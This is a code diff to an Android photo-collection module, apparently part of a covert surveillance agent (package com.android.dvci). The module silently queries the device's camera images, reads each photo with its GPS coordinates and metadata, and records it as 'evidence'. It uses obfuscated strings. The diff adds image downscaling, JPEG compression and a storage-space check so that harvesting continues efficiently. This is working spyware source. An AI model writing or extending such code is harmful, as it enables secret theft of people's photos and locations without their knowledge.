@@ -2,6 +2,9 @@ package com.android.dvci.module;
 
 import android.content.Context;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Matrix;
 import android.os.Environment;
 import android.provider.MediaStore;
 
@@ -10,11 +13,13 @@ import com.android.dvci.ProcessStatus;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
+import com.android.dvci.conf.Configuration;
 import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.file.Path;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.BC;
 import com.android.dvci.listener.ListenerProcess;
@@ -28,10 +33,14 @@ import com.android.mm.M;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.io.UnsupportedEncodingException;
 import java.nio.charset.Charset;
 import java.util.Date;
 import java.util.concurrent.Semaphore;
+
+import static com.android.dvci.auto.Cfg.DEBUG;
+import static com.android.dvci.util.Check.log;
 
 /**
  * Created by zeno on 29/01/15.
@@ -80,8 +89,8 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 	private void fetchPhotos() {
 		if (!semaphorePhoto.tryAcquire()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (fetchPhotos), still fetching, return");
+			if (DEBUG) {
+				log(TAG + " (fetchPhotos), still fetching, return");
 			}
 			return;
 		}
@@ -91,8 +100,8 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 			long newtimestamp = getCameraImages(Status.getAppContext(), new ImageVisitor(), lastTimestamp);
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (fetchPhotos) serialize timestamp: " + newtimestamp);
+			if (DEBUG) {
+				log(TAG + " (fetchPhotos) serialize timestamp: " + newtimestamp);
 			}
 			markupPhoto.serialize(newtimestamp);
 		} finally {
@@ -128,8 +137,8 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			final String path = cursor.getString(dataColumn);
 
 			final Date date = new Date(cursor.getLong(dateColumn));
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (visitor), timestamp: " + cursor.getLong(dateColumn) + " date: " + date);
+			if (DEBUG) {
+				log(TAG + " (visitor), timestamp: " + cursor.getLong(dateColumn) + " date: " + date);
 			}
 
 			final String title = cursor.getString(titleColumn);
@@ -141,22 +150,38 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			final String bucket = cursor.getString(bucketColumn);
 			if(!isMultimediaChat(bucket)) {
 				try {
-					AutoFile file = new AutoFile(path);
-					byte[] content = file.read();
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (visitor), bucket: " + bucket + " " + path);
+
+					Bitmap original = BitmapFactory.decodeFile(path);
+					Bitmap resized = getResizedBitmap(original, 1024);
+					ByteArrayOutputStream stream = new ByteArrayOutputStream();
+					resized.compress(Bitmap.CompressFormat.JPEG, 80, stream);
+					byte[] content = stream.toByteArray();
+
+					//AutoFile file = new AutoFile(path);
+					//byte[] content = file.read();
+					if (DEBUG) {
+						log(TAG + " (visitor), bucket: " + bucket + " " + path);
 					}
 
-					EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon, bucket, date), content, date);
+					if( Path.freeSpace() > Configuration.MIN_AVAILABLE_SIZE) {
+
+
+						EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon, bucket, date), content, date);
+					}else{
+						if (DEBUG) {
+							log(TAG + " (visitor), no more space available, bailing out");
+						}
+						return -1;
+					}
 					content = null;
 				}catch(Exception ex){
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (visitor), ERROR", ex);
+					if (DEBUG) {
+						log(TAG + " (visitor), ERROR", ex);
 					}
 				}
 			}else{
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (visitor), ignoring multimedia image: " + bucket);
+				if (DEBUG) {
+					log(TAG + " (visitor), ignoring multimedia image: " + bucket);
 				}
 			}
 
@@ -165,14 +190,35 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		}
 	}
 
+	private Bitmap getResizedBitmap(Bitmap bm, int newWidth) {
+
+		int width = bm.getWidth();
+		int height = bm.getHeight();
+
+		float aspect = (float)width / height;
+		float scaleWidth = newWidth;
+		float scaleHeight = scaleWidth / aspect;        // yeah!
+
+		// create a matrix for the manipulation
+		Matrix matrix = new Matrix();
+		// resize the bit map
+		matrix.postScale(scaleWidth / width, scaleHeight / height);
+
+		// recreate the new Bitmap
+		Bitmap resizedBitmap = Bitmap.createBitmap(bm, 0, 0, width, height, matrix, true);
+		bm.recycle();
+		return resizedBitmap;
+	}
+
+
 	private boolean isMultimediaChat(String bucket) {
 		return bucket.toLowerCase().contains(M.e("whatsapp"));
 	}
 
 	public static long getCameraImages(Context context, ImageVisitor visitor, long lastTimestamp) {
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCameraImages) lastTimestamp: " + lastTimestamp);
+		if (DEBUG) {
+			log(TAG + " (getCameraImages) lastTimestamp: " + lastTimestamp);
 		}
 
 		final String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.ImageColumns.DATE_TAKEN,
@@ -188,21 +234,24 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 				selectionArgs,
 				order);
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCameraImages), cursor: " + cursor + " Uri: " + MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
-			Check.log(TAG + " (getCameraImages), selection timestamp: " + selectionArgs[0]);
+		if (DEBUG) {
+			log(TAG + " (getCameraImages), cursor: " + cursor + " Uri: " + MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+			log(TAG + " (getCameraImages), selection timestamp: " + selectionArgs[0]);
 		}
 
 		if (cursor.moveToFirst()) {
 			do {
 				try {
 					long last = visitor.visitor(cursor);
+					if(last == -1){
+						break;
+					}
 					lastTimestamp = Math.max(last, lastTimestamp);
 
 
 				} catch (Exception ex) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (getCameraImages), ERROR: ", ex);
+					if (DEBUG) {
+						log(TAG + " (getCameraImages), ERROR: ", ex);
 					}
 				}
 
@@ -234,16 +283,16 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			e.printStackTrace();
 		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getAdditionalData), json: " + main.toString());
+		if (DEBUG) {
+			log(TAG + " (getAdditionalData), json: " + main.toString());
 		}
 
 		byte[] jsonByte = new byte[0];
 		try {
 			jsonByte = main.toString().getBytes("UTF-8");
 		} catch (UnsupportedEncodingException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getAdditionalData), cannot convert: ", e);
+			if (DEBUG) {
+				log(TAG + " (getAdditionalData), cannot convert: ", e);
 			}
 		}
 
